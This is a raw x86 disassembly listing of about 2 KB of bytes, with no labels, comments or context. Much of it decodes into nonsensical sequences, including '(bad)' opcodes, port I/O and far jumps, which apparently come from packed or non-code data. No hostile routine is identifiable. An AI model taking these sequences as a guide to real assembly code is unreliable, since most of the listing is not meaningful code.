  417710:	sub    eax,0xf8ddb65b
  417715:	neg    BYTE PTR [edi]
  417717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417718:	pop    ds
  417719:	xchg   ecx,eax
  41771a:	add    bh,BYTE PTR [esi]
  41771c:	imul   esp
  41771e:	sbb    eax,0x29610792
  417723:	lods   al,BYTE PTR ds:[esi]
  417724:	add    ebp,DWORD PTR [eax-0x5b]
  417727:	fisubr WORD PTR [ebx]
  417729:	cmc    
  41772a:	sbb    eax,0xef8b5414
  41772f:	mov    ah,0xf3
  417731:	and    dl,BYTE PTR [esi+0x31]
  417734:	sar    esi,1
  417736:	and    eax,edi
  417738:	fucom  st(0)
  41773a:	mov    ds:0x5e4bb0d7,eax
  41773f:	aam    0x7e
  417741:	sub    eax,0xe4739e1c
  417746:	out    dx,eax
  417747:	(bad)  
  417748:	ficomp WORD PTR [esi+0x5de3a80d]
  41774e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41774f:	xor    esi,ebx
  417751:	mov    al,0x1b
  417753:	or     eax,0x9c9fbc2d
  417758:	push   es
  417759:	cdq    
  41775a:	cli    
  41775b:	push   esp
  41775c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41775e:	pop    es
  41775f:	mov    esp,0x7316f109
  417764:	sub    edi,DWORD PTR ds:[edx]
  417767:	sbb    DWORD PTR ds:[edi],0xfe90807f
  41776e:	enter  0xfb03,0x2d
  417772:	cmp    bl,BYTE PTR [eax]
  417774:	mov    ds,WORD PTR [edi+0x27]
  417777:	lods   al,BYTE PTR ds:[esi]
  417778:	in     al,dx
  417779:	adc    eax,0xd9e92e04
  41777e:	or     esp,esi
  417780:	jnp    0x41774d
  417782:	out    dx,al
  417783:	push   esp
  417784:	or     BYTE PTR [esi-0x1b3a018d],0x2c
  41778b:	in     eax,dx
  41778c:	adc    DWORD PTR [edi+0x26],ebp
  41778f:	in     eax,0x2a
  417791:	sub    DWORD PTR [edi+0x6f],ebp
  417794:	or     eax,DWORD PTR [ecx-0xf]
  417797:	jno    0x417766
  417799:	or     al,dh
  41779b:	jns    0x4177e1
  41779d:	sbb    BYTE PTR [ecx],dl
  41779f:	cli    
  4177a0:	rol    ebx,0x88
  4177a3:	jg     0x417809
  4177a5:	sub    cl,dh
  4177a7:	test   DWORD PTR [esi-0x47],edi
  4177aa:	pop    esi
  4177ab:	mov    ch,0xf9
  4177ad:	add    al,0xf
  4177af:	loop   0x417800
  4177b1:	push   edi
  4177b2:	inc    ecx
  4177b3:	daa    
  4177b4:	adc    edi,DWORD PTR [edi]
  4177b6:	out    dx,al
  4177b7:	adc    ebx,DWORD PTR [edx+0x6ff08b39]
  4177bd:	sbb    al,0x24
  4177bf:	out    dx,eax
  4177c0:	adc    bh,BYTE PTR [ebp-0x4d]
  4177c3:	rcl    ah,0xd6
  4177c6:	clc    
  4177c7:	dec    ebx
  4177c8:	and    eax,0x3127d53b
  4177cd:	test   eax,0xd409a73b
  4177d2:	retf   0x2795
  4177d5:	sub    edx,DWORD PTR [ebx+ebp*2+0x74]
  4177d9:	sqrtps xmm0,XMMWORD PTR ds:0x2ef33264
  4177e0:	mov    ecx,0xd6471e45
  4177e5:	or     ah,0x6c
  4177e8:	popa   
  4177e9:	dec    ecx
  4177ea:	and    al,0xb7
  4177ed:	rcr    bl,cl
  4177ef:	out    0x81,eax
  4177f1:	xchg   ebx,eax
  4177f2:	mov    dl,0xb2
  4177f4:	out    dx,al
  4177f5:	aas    
  4177f6:	mov    ebx,0x5c8a2515
  4177fb:	cs popa 
  4177fd:	dec    eax
  4177fe:	or     ebx,0xffffffbd
  417801:	jecxz  0x417840
  417803:	push   ecx
  417804:	(bad)  
  417805:	push   eax
  417806:	ror    DWORD PTR [eax+0xd],1
  417809:	in     eax,0x9c
  41780b:	loop   0x4177c6
  41780d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41780e:	shl    DWORD PTR [ecx+ebx*4+0x7ce5c073],0x5e
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
